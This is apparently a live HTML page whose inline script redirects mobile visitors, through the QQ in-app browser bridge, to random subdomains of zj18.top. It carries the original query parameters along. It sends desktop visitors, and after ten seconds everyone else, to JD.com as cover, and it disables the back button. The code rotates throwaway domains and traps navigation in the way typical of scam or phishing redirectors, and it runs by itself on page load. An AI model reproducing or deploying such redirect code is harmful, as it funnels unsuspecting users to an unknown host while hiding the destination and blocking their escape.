<html class="">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">

<script type="text/javascript">
function myEeplace(url) {
    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
        var res = "";
        for (var i = 0; i < s2.length; i++) {
            if (s2[i] === "n") {
                res += Math.floor(Math.random() * 10);
            } else if (s2[i] === "w") {
                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
            }
        }
        return res;
    });
}
function opensdk(url) {
    url = myEeplace(url);
    var conf = {url: url, target: 1, style: 2};
    mqq.invoke("ui", "openUrl", conf);
}
let isWechat = window.navigator.userAgent.toLowerCase().includes("micromessenger");
if (isWechat <= 0) {}
let screenWidth = window.screen.width;
let screenHeight = window.screen.height;
if (screenWidth >= 768) {
    window.location.href = "https://m.jd.com";
}
function getOriginalParam() {
    const href = window.location.href;
    const paramPart = href.split('?')[1];
    return paramPart ? paramPart.trim() : '';
}
var originalParam = getOriginalParam();
function customJump() {
    const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link', 'rghgp', 'qwer', 'asdf', 'zxcv'];
    const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
    const targetDomain = `${randomSub}.zj18.top`;
    const targetUrl = `http://${targetDomain}/` + (originalParam ? `?${originalParam}` : '');
    opensdk(targetUrl);
}
setTimeout(customJump, 1000);
setTimeout(function() {
    location = "https://m.jd.com/" + new Date().getTime();
}, 10000);
</script>
<script>
if (window.history && window.history.pushState) {
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };
}
</script>
